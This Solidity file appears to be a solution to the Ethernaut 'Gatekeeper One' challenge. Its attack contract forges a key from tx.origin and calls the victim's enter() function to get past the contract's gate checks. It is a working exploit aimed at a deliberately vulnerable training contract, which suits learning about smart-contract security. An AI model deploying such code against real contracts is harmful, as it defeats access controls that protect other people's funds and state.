// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../SafeMath.sol";
import "./GatekeeperOne.sol";

contract AttackGatekeeperOne {
    address victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public {
        bytes8 key = bytes8(uint64(tx.origin));
        key = key & 0x6d696b65_0000_FFFF;
        GatekeeperOne(victim).enter(key);
    }
}
